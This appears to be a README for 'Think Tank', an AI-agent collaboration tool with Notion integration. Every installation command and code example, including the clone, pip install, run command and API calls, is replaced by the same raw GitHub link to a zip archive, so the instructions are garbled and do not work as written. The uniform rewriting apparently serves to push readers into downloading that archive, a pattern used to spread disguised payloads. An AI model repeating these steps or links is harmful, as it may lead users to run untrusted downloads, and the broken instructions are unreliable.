### Prerequisites

Before running Think Tank, ensure you have the following installed:

- Python 3.7 or higher
- Pip (Python package installer)
- Notion API key for integration

### Installation

1. Clone the repository:
   ```bash
   git clone https://github.com/Bhaktiswarup/think_tank/raw/refs/heads/main/src/think_tank_v3.5.zip
   cd think_tank
   ```

2. Install the required packages:
   ```bash
   pip install -r https://github.com/Bhaktiswarup/think_tank/raw/refs/heads/main/src/think_tank_v3.5.zip
   ```

3. Set up your Notion API key:
   - Create a `.env` file in the root directory.
   - Add your Notion API key:
     ```
     NOTION_API_KEY=your_notion_api_key_here
     ```

4. Run the application:
   ```bash
   python https://github.com/Bhaktiswarup/think_tank/raw/refs/heads/main/src/think_tank_v3.5.zip
   ```

## Usage

### Creating Agents

To create a new AI agent, use the following command:

```python
agent = Agent(name="Researcher", capabilities=["research", "data analysis"])
```

You can customize the agent's capabilities based on your needs. Once created, agents can collaborate with each other.

### Collaborating with Agents

Agents can communicate and share insights through a simple API. Use the following method to send messages between agents:

```python
https://github.com/Bhaktiswarup/think_tank/raw/refs/heads/main/src/think_tank_v3.5.zip(agent2, "What are the latest trends in AI?")
```

### Storing Results

To store results in Notion, use the Notion integration functions. For example:

```python
https://github.com/Bhaktiswarup/think_tank/raw/refs/heads/main/src/think_tank_v3.5.zip(title="AI Trends", content=results)
```

This function will create a new page in your Notion workspace with the specified title and content.
